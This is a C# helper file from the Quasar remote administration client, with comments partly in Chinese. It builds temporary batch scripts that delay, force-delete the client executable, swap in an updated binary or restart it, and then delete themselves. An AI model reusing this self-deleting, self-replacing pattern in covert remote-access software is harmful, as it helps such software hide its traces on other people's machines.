using Quasar.Common.Helpers;
using System.IO;
using System.Text;

namespace Quasar.Client.IO
{
    /// <summary>
    /// 提供了为应用程序更新、卸载和重启操作创建批处理文件的方法。
    /// </summary>
    public static class BatchFile
    {
        /// <summary>
        /// 创建卸载批处理文件。
        /// </summary>
        /// <param name="currentFilePath">客户端的当前文件路径。</param>
        /// <returns>批处理文件的文件路径，然后可以得到执行。失败时返回<c>string.Empty</c>。</returns>
        public static string CreateUninstallBatch(string currentFilePath)
        {
            string batchFile = FileHelper.GetTempFilePath(".bat");

            string uninstallBatch =
                "@echo off" + "\r\n" +
                "chcp 65001" + "\r\n" + // 对西里尔文、中文、英文的Unicode路径支持。
                "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                "ping -n 10 localhost > nul" + "\r\n" +
                "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                "del /a /q /f " + "\"" + batchFile + "\"";

            File.WriteAllText(batchFile, uninstallBatch, new UTF8Encoding(false));
            return batchFile;
        }

        /// <summary>
        /// 创建更新批处理文件。
        /// </summary>
        /// <param name="currentFilePath">客户端的当前文件路径。</param>
        /// <param name="newFilePath">客户端的新文件路径。</param>
        /// <returns>批处理文件的文件路径，然后可以得到执行。失败时返回一个空字符串。</returns>
        public static string CreateUpdateBatch(string currentFilePath, string newFilePath)
        {
            string batchFile = FileHelper.GetTempFilePath(".bat");

            string updateBatch =
                "@echo off" + "\r\n" +
                "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                "ping -n 10 localhost > nul" + "\r\n" +
                "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + currentFilePath + "\"" + "\r\n" +
                "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
                "del /a /q /f " + "\"" + batchFile + "\"";

            File.WriteAllText(batchFile, updateBatch, new UTF8Encoding(false));
            return batchFile;
        }

        /// <summary>
        /// 创建重启批处理文件。
        /// </summary>
        /// <param name="currentFilePath">客户端的当前文件路径。</param>
        /// <returns>批处理文件的文件路径，然后可以得到执行。失败时返回<c>string.Empty</c>。</returns>
        public static string CreateRestartBatch(string currentFilePath)
        {
            string batchFile = FileHelper.GetTempFilePath(".bat");

            string restartBatch =
                "@echo off" + "\r\n" +
                "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                "ping -n 10 localhost > nul" + "\r\n" +
                "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
                "del /a /q /f " + "\"" + batchFile + "\"";

            File.WriteAllText(batchFile, restartBatch, new UTF8Encoding(false));

            return batchFile;
        }
    }
}
